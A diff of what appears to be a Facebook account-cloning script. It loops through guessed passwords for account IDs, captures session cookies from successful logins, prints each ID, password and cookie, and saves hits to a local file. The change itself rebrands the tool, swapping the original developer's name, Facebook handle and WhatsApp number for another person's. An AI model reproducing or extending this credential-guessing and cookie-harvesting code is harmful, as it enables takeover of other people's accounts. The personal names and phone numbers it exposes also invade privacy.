@@ -59,12 +59,12 @@ def tanim():
         return ua
 logo= ("""        
         \x1b[38;5;83m __..__..  .._..__
-        \x1b[38;5;84m(__ [__]|\/| | [__)
-        \x1b[38;5;85m.__)|  ||  |_|_|  \  \x1b[38;5;197m(V4)
+        \x1b[38;5;84m(__ [  ]|--| || [__)
+        \x1b[38;5;85m.__)|__|| _| || [__) \x1b[38;5;197m(V4)
 \x1b[38;5;77m──────────────────────────────────────────────                 
-\x1b[38;5;78m〘✧〙DEVLOPER  \x1b[38;5;222m➤  \x1b[38;5;78m SADMAN SAMIR SNIGDHO
-\x1b[38;5;79m〘✧〙FACEBOOK  \x1b[38;5;222m➤  \x1b[38;5;79m SNIGDHO AFRIDI
-\x1b[38;5;115m〘✧〙WHATSAPP  \x1b[38;5;222m➤   \x1b[38;5;115m+8801871778635
+\x1b[38;5;78m〘✧〙DEVLOPER  \x1b[38;5;222m➤  \x1b[38;5;78m SOJIB AHAMED NAKIB 
+\x1b[38;5;79m〘✧〙FACEBOOK  \x1b[38;5;222m➤  \x1b[38;5;79m N A K I B 
+\x1b[38;5;115m〘✧〙WHATSAPP  \x1b[38;5;222m➤   \x1b[38;5;115m+88010740148347
 \x1b[38;5;78m〘✧〙TOOLS     \x1b[38;5;222m➤   \x1b[38;5;78mRANDOM CLONE    \x1b[38;5;197m(FREE)
 \x1b[38;5;77m──────────────────────────────────────────────""")
 def linex():
@@ -111,7 +111,7 @@ def bhoot():
     
 def api(ids,pwv,tl):
     global loop,oks,cps,twf
-    sys.stdout.write(f'\r\x1b[38;5;155m[➤] SAMIR~FINDING  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
+    sys.stdout.write(f'\r\x1b[38;5;155m[➤] NAKIB~FINDING  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
     try:
         for pas in pwv:
             adid = str(uuid.uuid4())
@@ -155,7 +155,7 @@ def api(ids,pwv,tl):
                     cok.update({x["name"]:x["value"]})
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                 ids = re.findall('c_user=(.*);xs', kuki)[0]
-                print(f'\r\x1b[38;5;84m[SAMIR-LIVE] '+ids+' ~~ '+pas+'\x1b[38;5;155m')
+                print(f'\r\x1b[38;5;84m[NAKIB-LIVE] '+ids+' ~~ '+pas+'\x1b[38;5;155m')
                 print('\033[1;92m[COOKIE] : ➤ : '+kuki+'\x1b[38;5;223m');linex()
                 oks.append(ids)
                 open('/sdcard/SAMIR-OKS.txt','a').write(ids+' | '+pas+'\n')
